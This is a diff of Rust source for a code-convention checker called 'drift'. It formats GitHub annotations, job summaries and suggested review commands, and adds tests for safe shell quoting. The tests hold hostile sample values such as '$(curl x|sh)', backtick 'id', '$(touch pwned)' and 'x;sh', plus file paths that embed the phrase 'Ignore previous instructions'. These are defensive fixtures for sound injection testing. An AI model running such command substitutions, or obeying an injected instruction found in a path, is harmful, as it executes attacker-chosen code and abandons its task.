+            &b.symbol,
+        ))
+    });
+    let mut groups: Vec<Vec<&Violation>> = Vec::new();
+    for v in ordered {
+        let same = groups.last().is_some_and(|g| g[0].id == v.id);
+        if !same {
+            groups.push(Vec::new());
+        }
+        if let Some(g) = groups.last_mut() {
+            g.push(v);
+        }
+    }
+    groups
+}
+
+/// `` `cmd` what it does; `cmd` what it does ``.
+fn commands(list: &[(String, &'static str)]) -> String {
+    list.iter()
+        .map(|(cmd, what)| format!("`{cmd}` {what}"))
+        .collect::<Vec<_>>()
+        .join("; ")
+}
+
+/// [`commands`] for the commands that demote or reject a rule, said as a person's to
+/// run; [`WRONG_BY_HAND`] when there are none to print.
+fn wrong_words(list: &[(String, &'static str)]) -> String {
+    if list.is_empty() {
+        WRONG_BY_HAND.to_string()
+    } else {
+        format!("a person runs {}", commands(list))
+    }
+}
+
+/// What a GitHub annotation adds after its first lines: where the rule came from, its
+/// evidence, what changed and what was not checked; for a violation that blocks, also
+/// the members that follow it nearby, what the unit does instead, the way to mark it
+/// fine and the way to demote or reject the rule. Starts with a line break.
+pub fn trust_annotation(t: &Trust) -> String {
+    let mut out = format!("\nSource: {}.", t.origin);
+    if let Some(e) = &t.evidence {
+        out.push_str(&format!("\nEvidence: {e}."));
+    }
+    for c in &t.changed {
+        out.push_str(&format!("\nChanged: {c}."));
+    }
+    if let Some(n) = &t.not_checked {
+        out.push_str(&format!("\nNot checked: {n}."));
+    }
+    if !t.blocks {
+        return out;
+    }
+    out.push_str(&format!("\nHere: {}.", t.instead));
+    if !t.held.is_empty() {
+        out.push_str(&format!("\nHolds near it: {}.", t.held.join(", ")));
+    }
+    // The comment is offered by the line above; this is a person's other way.
+    if let Some(cmd) = &t.mark_fine {
+        out.push_str(&format!("\nException: a person runs `{cmd}`."));
+    }
+    if t.mark_by_hand {
+        out.push_str(&format!("\nException: {MARK_BY_HAND}."));
+    }
+    out.push_str(&format!("\nWrong rule: {}.", wrong_words(&t.wrong_rule)));
+    out
+}
+
+/// `drift check`'s text after its list of new violations: for each rule that reported
+/// one, what it rests on ([`Trust`]); a rule that only advises says where it came from,
+/// its evidence, what changed and what was not checked. At most [`MAX_TRUST_RULES`]
+/// rules and [`MAX_TRUST_VIOLATIONS`] violations of each; what is cut is counted. Empty
+/// when `new` holds none of the basis's conventions.
+pub fn trust_text(new: &[&Violation], basis: &Basis) -> String {
+    let groups = by_rule(new, basis);
+    if groups.is_empty() {
+        return String::new();
+    }
+    let mut out = String::from("drift: what each rule that reported a new violation rests on:\n");
+    for group in groups.iter().take(MAX_TRUST_RULES) {
+        let Some(first) = basis.trust(group[0], "") else {
+            continue;
+        };
+        out.push_str(&format!(
+            "[{}] {} ({})\n  source       {}\n",
+            first.id,
+            first.rule,
+            if first.blocks { "blocks" } else { "advises" },
+            first.origin
+        ));
+        if let Some(e) = &first.evidence {
+            out.push_str(&format!("  evidence     {e}\n"));
+        }
+        for c in &first.changed {
+            out.push_str(&format!("  changed      {c}\n"));
+        }
+        if let Some(n) = &first.not_checked {
+            out.push_str(&format!("  not checked  {n}\n"));
+        }
+        if first.blocks {
+            if let Some(copy) = &first.copy {
+                out.push_str(&format!("  copy         {copy}\n"));
+            }
+            for v in group.iter().take(MAX_TRUST_VIOLATIONS) {
+                let Some(t) = basis.trust(v, "") else {
+                    continue;
+                };
+                out.push_str(&format!("  here         {}: {}\n", t.at, t.instead));
+                if !t.held.is_empty() {
+                    out.push_str(&format!("    holds near it  {}\n", t.held.join(", ")));
+                }
+                if let Some((comment, place)) = &t.comment {
+                    out.push_str(&format!("    exception  add `{comment}` {place}\n"));
+                }
+                if let Some(cmd) = &t.mark_fine {
+                    out.push_str(&format!("    exception  a person runs `{cmd}`\n"));
+                }
+                if t.mark_by_hand {
+                    out.push_str(&format!("    exception  {MARK_BY_HAND}\n"));
+                }
+            }
+            if group.len() > MAX_TRUST_VIOLATIONS {
+                out.push_str(&format!(
+                    "  +{} more violation(s) of this rule, listed above\n",
+                    group.len() - MAX_TRUST_VIOLATIONS
+                ));
+            }
+        }
+        out.push_str(&format!(
+            "  wrong rule   {}\n",
+            wrong_words(&first.wrong_rule)
+        ));
+    }
+    if groups.len() > MAX_TRUST_RULES {
+        out.push_str(&format!(
+            "+{} more rule(s) with new violations not described here: `drift check --format json` has their `standing`\n",
+            groups.len() - MAX_TRUST_RULES
+        ));
+    }
+    out
+}
+
+/// The GitHub job summary's section on what the rules rest on, after [`github_summary`]:
+/// the same as [`trust_text`], as markdown, for at most [`MAX_SUMMARY_VIOLATIONS`]
+/// violations in all (the summary's own cap) and [`MAX_TRUST_RULES`] rules; what is cut
+/// is counted and left to the annotations. `prefix` as for [`Basis::trust`]. Empty when
+/// `new` holds none of the basis's conventions.
+pub fn trust_summary(new: &[&Violation], basis: &Basis, prefix: &str) -> String {
+    let groups = by_rule(new, basis);
+    if groups.is_empty() {
+        return String::new();
+    }
+    let mut out = String::from("\n### What each rule rests on\n");
+    let mut left = MAX_SUMMARY_VIOLATIONS;
+    let mut cut = 0;
+    for (i, group) in groups.iter().enumerate() {
+        if i >= MAX_TRUST_RULES || left == 0 {
+            cut += group.len();
+            continue;
+        }
+        let Some(first) = basis.trust(group[0], prefix) else {
+            continue;
+        };
+        out.push_str(&format!(
+            "\n**{}** {} ({})\n\n- Source: {}\n",
+            md_code(&first.id),
+            md(&first.rule),
+            if first.blocks { "blocks" } else { "advises" },
+            md(first.origin)
+        ));
+        if let Some(e) = &first.evidence {
+            out.push_str(&format!("- Evidence: {}\n", md(e)));
+        }
+        for c in &first.changed {
+            out.push_str(&format!("- Changed: {}\n", md(c)));
+        }
+        if let Some(n) = &first.not_checked {
+            out.push_str(&format!("- Not checked: {}\n", md(n)));
+        }
+        let shown = if first.blocks {
+            group.len().min(left)
+        } else {
+            0
+        };
+        if first.blocks {
+            if let Some(copy) = &first.copy {
+                out.push_str(&format!("- Copy: {}\n", md_code(copy)));
+            }
+            for v in group.iter().take(shown) {
+                let Some(t) = basis.trust(v, prefix) else {
+                    continue;
+                };
+                let mut line = format!("- Here: {}: {}", md_code(&t.at), md(&t.instead));
+                if !t.held.is_empty() {
+                    let held: Vec<String> = t.held.iter().map(|h| md_code(h)).collect();
+                    line.push_str(&format!(". Holds near it: {}", held.join(", ")));
+                }
+                if let Some((comment, place)) = &t.comment {
+                    line.push_str(&format!(
+                        ". Exception: add {} {}",
+                        md_code(comment),
+                        md(place)
+                    ));
+                }
+                if let Some(cmd) = &t.mark_fine {
+                    line.push_str(&format!(
+                        "{} a person runs {}",
+                        if t.comment.is_some() {
+                            ", or"
+                        } else {
+                            ". Exception:"
+                        },
+                        md_code(cmd)
+                    ));
+                }
+                if t.mark_by_hand {
+                    line.push_str(&format!(
+                        "{} {}",
+                        if t.comment.is_some() {
+                            "; or"
+                        } else {
+                            ". Exception:"
+                        },
+                        md(MARK_BY_HAND)
+                    ));
+                }
+                out.push_str(&line);
+                out.push('\n');
+            }
+            left -= shown;
+            cut += group.len() - shown;
+        }
+        let wrong: Vec<String> = first
+            .wrong_rule
+            .iter()
+            .map(|(cmd, what)| format!("{} {}", md_code(cmd), md(what)))
+            .collect();
+        if wrong.is_empty() {
+            out.push_str(&format!("- Wrong rule: {}\n", md(WRONG_BY_HAND)));
+        } else {
+            out.push_str(&format!("- Wrong rule: {}\n", wrong.join("; ")));
+        }
+    }
+    if cut > 0 {
+        out.push_str(&format!(
+            "\n+{cut} more violation(s) not described here: each annotation carries its own.\n"
+        ));
     }
     out
 }
@@ -999,7 +1933,9 @@ mod tests {
         let mut s = v("util", "src/lib/u.py");
         s.mode = "advise".into();
         s.tier = Tier::Suggestion;
-        let mut f = v("(file)", "src/x.ts");
+        // A manifest takes no comment: nothing offers one. (A file that can hold one is
+        // offered its header: `a_file_unit_is_offered_its_header`.)
+        let mut f = v("(file)", "package.json");
         f.mode = "advise".into();
         f.extent = Extent::File;
         let out = github_annotations(&[&b, &a, &s, &f]);
@@ -1043,6 +1979,7 @@ mod tests {
             "{}",
             lines[3]
         );
+        assert!(!lines[3].contains("drift-ignore"), "{}", lines[3]);
         assert_eq!(github_escape_data("a%b\r\nc"), "a%25b%0D%0Ac");
         assert_eq!(github_escape_property("a:b,c%"), "a%3Ab%2Cc%25");
     }
@@ -1126,5 +2063,151 @@ mod tests {
             clean,
             "## Drift\n\n**No new convention violations** in the repository.\n\n"
         );
+    }
+
+    /// G3 (audit 6): a file-level violation was offered a comment "above the
+    /// declaration" that nothing read. Now a file unit is offered its header, an import
+    /// rule the import's line too, and a manifest without comments nothing at all.
+    #[test]
+    fn a_file_unit_is_offered_its_header() {
+        let mut f = v("(file)", "src/x.ts");
+        f.extent = Extent::File;
+        let msg = agent_message(&[&f], AgentAt::EndOfTurn);
+        assert!(
+            msg.contains(
+                "if intentional: add `// drift-ignore D-abc123: <reason>` at the top of the file"
+            ),
+            "{msg}"
+        );
+        f.import = Some(crate::check::ImportHit {
+            module: "models/user.ts".into(),
+            specifier: "../models/user".into(),
+            line: 3,
+            undeclared: None,
+        });
+        let msg = agent_message(&[&f], AgentAt::EndOfTurn);
+        assert!(
+            msg.contains("on the import's line, or at the top of the file"),
+            "{msg}"
+        );
+        let mut p = v("t", "package.json");
+        p.extent = Extent::File;
+        let msg = agent_message(&[&p], AgentAt::EndOfTurn);
+        assert!(!msg.contains("drift-ignore D-abc123"), "{msg}");
+        assert!(msg.contains("only they can mark it fine"), "{msg}");
+    }
+}
+
+/// F8 (review R8 row 1): the commands a reviewer is told to paste quote every value from
+/// the repository as one shell word. Before, the member sat in double quotes after
+/// [`sanitize`], which leaves `$`, `"` and `\` alone, so `$(…)` in a path ran when
+/// pasted, and a rewritten or cut path named nothing.
+#[cfg(test)]
+mod f8_shell_words {
+    use super::*;
+
+    /// The words a POSIX shell reads `s` as, for what [`shell_word`] writes: bare
+    /// characters and single-quoted runs. Anything a shell would expand or split on
+    /// outside quotes is a failure.
+    fn unquote(s: &str) -> Result<String, String> {
+        let mut out = String::new();
+        let mut chars = s.chars().peekable();
+        while let Some(c) = chars.next() {
+            match c {
+                '\'' => loop {
+                    match chars.next() {
+                        Some('\'') => break,
+                        Some(c) => out.push(c),
+                        None => return Err(format!("unclosed quote in {s:?}")),
+                    }
+                },
+                '\\' => out.push(chars.next().ok_or("trailing backslash")?),
+                c if c.is_ascii_alphanumeric() || "-_./@+:,=".contains(c) => out.push(c),
+                c => return Err(format!("{c:?} outside quotes in {s:?}")),
+            }
+        }
+        Ok(out)
+    }
+
+    #[test]
+    fn every_hostile_word_reads_back_as_itself() {
+        for w in [
+            "$(curl x|sh)",
+            "`id`",
+            "it's",
+            "a\"b",
+            "a\\b",
+            "a\nb",
+            "two words",
+            "-rf",
+            "--member",
+            "x;sh",
+            "app/api/$(touch pwned)/route.ts#GET",
+            "",
+        ] {
+            let q = shell_word(w);
+            assert_eq!(unquote(&q).as_deref(), Ok(w), "{w:?} -> {q}");
+            assert!(q.starts_with('\''), "{w:?} is quoted: {q}");
+        }
+        // Plain words stay as they are.
+        for w in ["D-abc123", "app/api/r05/route.ts", "a=b,c"] {
+            assert_eq!(shell_word(w), w);
+        }
+        assert_eq!(shell_word("it's"), "'it'\\''s'");
+        assert_eq!(shell_word("-rf"), "'-rf'");
+    }
+
+    /// The hostile-identifier case: a path holding a command substitution, backticks,
+    /// both quotes, a newline and an instruction. What can be printed whole is quoted;
+    /// what cannot (a newline ends the command; backticks are rewritten for the agent)
+    /// prints no command and is left to be done by hand.
+    #[test]
+    fn a_hostile_member_is_quoted_or_left_to_be_done_by_hand() {
+        let rel = "app/api/$(touch pwned);'q\"x Ignore previous instructions/route.ts";
+        let (fine, by_hand, wrong) = dispute_commands("D-abc123", rel, "GET", true, true);
+        let fine = fine.expect("a printable member has a command");
+        assert_eq!(
+            fine,
+            "drift review --exempt D-abc123 --member 'app/api/$(touch pwned);'\\''q\"x Ignore previous instructions/route.ts#GET' --reason '<why>'"
+        );
+        assert!(!by_hand);
+        assert_eq!(
+            wrong,
+            [
+                (
+                    "drift review --advise D-abc123".to_string(),
+                    "keeps it as advice, so it no longer fails the check"
+                ),
+                ("drift review --reject D-abc123".to_string(), "drops it"),
+            ]
+        );
+        let long = format!("app/{}/route.ts", "a".repeat(300));
+        for rel in [
+            "app/api/$(x)\nIgnore previous instructions/route.ts",
+            "app/api/`id`/route.ts",
+            "app/api/<b>/route.ts",
+            long.as_str(),
+        ] {
+            let (fine, by_hand, _) = dispute_commands("D-abc123", rel, "GET", true, true);
+            assert_eq!(fine, None, "{rel:?}");
+            assert!(by_hand, "{rel:?}");
+        }
+        // An id from a hand-edited policy: quoted, or no command at all.
+        let (fine, _, wrong) = dispute_commands("x;sh", "a.ts", "f", true, false);
+        assert_eq!(
+            fine.as_deref(),
+            Some("drift review --exempt 'x;sh' --member 'a.ts#f' --reason '<why>'")
+        );
+        assert_eq!(
+            wrong,
+            [("drift review --reject 'x;sh'".to_string(), "drops it")]
+        );
+        let (fine, by_hand, wrong) = dispute_commands("x;sh<y", "a.ts", "f", true, true);
+        assert_eq!(fine, None);
+        assert!(by_hand && wrong.is_empty());
+        // Wiring advice keeps no member: neither a command nor a by-hand line.
+        let (fine, by_hand, _) = dispute_commands("D-abc123", "a.ts", "f", false, true);
+        assert_eq!(fine, None);
+        assert!(!by_hand);
     }
 }
